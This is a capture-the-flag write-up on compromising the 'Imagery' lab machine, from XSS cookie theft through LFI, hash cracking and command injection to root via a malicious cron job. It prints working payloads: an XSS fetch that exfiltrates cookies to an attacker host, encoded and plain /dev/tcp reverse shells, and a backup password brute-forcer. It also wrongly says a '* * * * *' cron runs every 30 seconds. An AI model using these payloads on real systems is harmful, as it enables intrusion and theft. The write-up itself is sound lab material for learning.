---
tags:
  - Linux
  - Medium
  - WebApp
  - XSS
  - LFI
  - Command_Injection
  - charcol
  - cron
---
![Machine Writeups/Linux/Medium/Imagery/Images/banner.png](Images/banner.png)

## User

### Port Scan

As always, we start off with an nmap scan. The results only show two ports open, SSH and HTTP over port 8000.

```
# Nmap 7.95 scan initiated Sun Sep 28 03:09:54 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/imagery 10.129.187.50
Nmap scan report for 10.129.187.50
Host is up, received echo-reply ttl 63 (0.065s latency).
Scanned at 2025-09-28 03:09:55 GMT for 9s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 28 03:10:04 2025 -- 1 IP address (1 host up) scanned in 9.64 seconds

```

### Exploiting XSS in the Admin's Bug Report Page

On the web app, we're presented with an image upload/personalization application. First, we can register for an account and log in. After registering an account and logging in, there isn't much to go off of at first. We can upload pictures and view our gallery, but nothing interesting. However, inspecting the page source code reveals oddly verbose JavaScript code relating to the routes and functions of each of the pages. One such set of functions reveals that a user can submit a bug report (which isn't an immediately visible feature on the web app) that the admin can view.

```
async function submitBugReport(event) {
 event.preventDefault();
 const bugName = document.getElementById('bugName').value.trim();
 const bugDetails = document.getElementById('bugDetails').value.trim();

 try {
  const response = await fetch(`${window.location.origin}/report_bug`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({ bugName, bugDetails })
  });
  const data = await response.json();
  if (data.success) {
   showMessage(data.message, 'success');
   document.getElementById('bugReportForm').reset();
   navigateTo('gallery');
  } else {
   showMessage(data.message, 'error');
  }
 } catch (error) {
  console.error('Bug report submission error:', error);
  showMessage('An unexpected error occurred during bug report submission.', 'error');
 }
}

async function loadBugReports() {
 const bugReportsList = document.getElementById('bug-reports-list');
 const noBugReports = document.getElementById('no-bug-reports');

 if (!bugReportsList || !noBugReports) {
  console.error("Error: Admin panel bug report elements not found.");
  return;
 }

 bugReportsList.innerHTML = '';
 noBugReports.style.display = 'none';

 try {
  const response = await fetch(`${window.location.origin}/admin/bug_reports`);
  const data = await response.json();

  if (data.success) {
   if (data.bug_reports.length === 0) {
    noBugReports.style.display = 'block';
   } else {
    data.bug_reports.forEach(report => {
     const reportCard = document.createElement('div');
     reportCard.className = 'bg-white p-6 rounded-xl shadow-md border-l-4 border-purple-500 flex justify-between items-center';
     
     reportCard.innerHTML = `
      <div>
       <p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
       <p class="text-sm text-gray-500 mb-2">Submitted by: ${DOMPurify.sanitize(report.reporter)} (ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}</p>
       <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
       <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
       <div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
        ${report.details}
       </div>
      </div>
      <button onclick="showDeleteBugReportConfirmation('${DOMPurify.sanitize(report.id)}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-200 ml-4">
       Delete
      </button>
     `;
     bugReportsList.appendChild(reportCard);
    });
   }
  } else {
   showMessage(data.message, 'error');
  }
 } catch (error) {
  console.error('Error loading bug reports:', error);
  showMessage('Failed to load bug reports. Please try again later.', 'error');
 }
}
```

These functions show that a user can submit a bug report via the `report_bug` endpoint by submitting a bug title and bug details. Those then get populated into the `loadBugReports` function, which puts the `${report.details}` straight into the HTML. This implies that the page is subject to Cross Site Scripting if an attacker puts an XSS payload into the bug details parameter.
So, we set up a Python HTTP server and use the following `curl` command to retrieve the admin's session cookie.

`curl -X POST http://10.129.192.113:8000/report_bug -H "Cookie: session=.eJyrVkrJLC7ISaz0TFGyUrJMMU0zTTU3UdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHcUZqQUOIEKvKD85u1ipFgDoqC9c.aNiqCQ.2uqDIbbpan2UWYEBcZpGFY0y8kA" -H "Content-Type: application/json" -d "{\"bugName\": \"bug\", \"bugDetails\": \"<img src=x onerror=fetch('http://<attacker ip>:<attacker port>/xss?c='+btoa(document.cookie)) />\"}"`

After a moment of waiting, the base64 encoded cookie is delivered to the HTTP server.

![exploiting xss.png](Images/exploiting%20xss.png)

We can replace our browser's session cookie with the one acquired and become the admin.

### Using LFI to Own the TestUser Account

Becoming the admin allows us to view the Admin Panel. One feature of the Admin Panel is to download and view user logs. Intercepting the request and modifying the file path reveals an LFI vulnerability.

![admin panel.png](Images/admin%20panel.png)
![lfi passwd.png](Images/lfi%20passwd.png)

This bug lets us view a common Flask file `config.py` which reveals the existence of `db.json`, revealing user hashes.

![config.py lfi.png](Images/config.py%20lfi.png)
![db.json lfi.png](Images/db.json%20lfi.png)

The admin hash was not crackable, but the password hash for `testuser@imagery.htb` was able to be cracked with the following `hashcat` command:

`hashcat -a 0 -m 0 2c65c8d7bfbca32a3ed42596192384f6 ~/Documents/rockyou.txt`

This reveals that `testuser@imagery.htb` has a password of `iambatman`.

### Exploiting Command Injection via the Transform Feature

Continuing to abuse the LFI bug, `app.py` reveals a few custom modules that are imported. One such module is `api_edit.py` which contains a few functions/endpoints that only a user with the `isTestuser` role has access to. When inspecting the code, the `/apply_visual_transform` route has a dangerous `subprocess.run` execution with `shell=True` enabled.

```
@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})

...

    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)

...
```

By passing malicious input into `width`, `height`, `x`, or `y`, we can abuse command injection. First, an image can be uploaded under the `testuser` account. Then, the `Transform Image` option can be selected, and then `crop` is chosen in the drop down. Finally, we can intercept the request and inject our payload into the `x` parameter, giving us a reverse shell.

![transform image button.png](Images/transform%20image%20button.png)

![crop selection.png](Images/crop%20selection.png)

![command injection.png](Images/command%20injection.png)

The payload I went for below is just a typical `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'` payload, but base64 encoded, which is then decoded and piped to bash. Sometimes special characters can make these injections difficult which is why I went that direction (I also included some extra spaces when base64 encoding the payload to avoid +'s and ='s from being in it).

`;echo 'YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxICcK' |base64 -d | bash #`

After sending the request, my listener caught the shell as the `web` user.

![web shell.png](Images/web%20shell.png)

### Cracking the Encrypted Backup to Pivot to Mark

Looking in the user's home directory unfortunately shows no `user.txt`. The only other user on the box is `mark`, so pivoting to him is the logical next step. After some enumeration, a special file is located at `/var/backup/web_20250806_120723.zip.aes`. After exfiltrating the encrypted zip, running the `file` command reveals that it was encrypted via `pyAesCrypt`.

![zip aes file.png](Images/zip%20aes%20file.png)

To try and decrypt the file, I wrote a Python script that iterates over each password in `rockyou.txt` and attempts to perform the decryption using `pyAesCrypt`. Once a successful decryption occurs, the program halts.

```
import pyAesCrypt

with open("/home/kali/Documents/rockyou.txt", "r") as file:
    for password in file:
        try:
            print(f"Trying: {password.strip()}")
            pyAesCrypt.decryptFile(
                "web_20250806_120723.zip.aes",
                "web_20250806_120723.zip",
                password.strip(),
            )
            print(f"{password.strip()} succeeded.")
            break
        except:
            pass
```

Running the program reveals that the password for the encrypted file is `bestfriends` and outputs the decrypted zip to `web_20250806_120723.zip`.

Unzipping the decrypted zip reveals a folder very similar to the `web` folder that is on the box. However, in its `db.json` file includes a hash for `mark`.

![mark hash.png](Images/mark%20hash.png)

We can crack the hash by storing it in `mark.hash` using `username:hash` format and using the following `hashcat` command:

`hashcat -a 0 -m 0 mark.hash ~/Documents/rockyou.txt --username`

Cracking `mark`'s hash gives a password of `supersmash`. Going back to the reverse shell, we can finally use `su mark`, enter the password, and obtain `user.txt`.

![mark shell.png](Images/mark%20shell.png)

## Root

### Resetting the Charcol Password

Now that we own `mark`, running `sudo -l` shows that we can run the `charcol` binary as root:
![Machine Writeups/Linux/Medium/Imagery/Images/mark sudo l.png](Images/mark%20sudo%20l.png)

However, in trying to run the binary, it first shows we need to use `shell` as an argument. Then, when trying that, it says that we need to enter a password. Fortunately, the `-R` flag lets us reset the password by authenticating with `mark`'s password. In doing so, we can set the new `charcol` password to be no password.

![password reset hint.png](Images/password%20reset%20hint.png)

![resetting password.png](Images/resetting%20password.png)

![setting no pass.png](Images/setting%20no%20pass.png)

### Creating a Malicious Cronjob

After setting the password to no password, we can get an interactive shell. Entering `help` into it reveals the following statements:

```
  Automated Jobs (Cron):                                                                                             
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]  
      Purpose: Add a new automated cron job managed by Charcol.                                                      
      Verification:                                                                                                  
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password fla
g).                                                                                                                  
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).     
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)
```

This shows that we can create new, automated cron jobs. To begin, I created a file `shell.sh` in `/dev/shm`:

```
#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

I then made it executable using `chmod +x /dev/shm/shell.sh`. Finally, **in the interactive shell**, I ran the following command to add the new cron job:

`auto add --schedule "* * * * *" --command "/dev/shm/shell.sh" --name "shell"`
(Note that `* * * * *` for the schedule sets the cron job to run every 30 seconds.)

I was prompted to then enter `mark`'s password to confirm the cron, which succeeded. Finally, I set up my listener and waited for the root shell to pop.

![Machine Writeups/Linux/Medium/Imagery/Images/popping root.png](Images/popping%20root.png)

## Credentials List

| Username             | Password          | Description                                                                                                                              |
| -------------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| <testuser@imagery.htb> | iambatman         | gives access to the web app as a test user                                                                                               |
| admin                | strongsandofbeach | gives admin access to the web app. Found after getting the reverse shell and viewing the bot script in the `/home/web/web/bot` directory |
| mark                 | supersmash        | `mark`'s account on the box                                                                                                              |
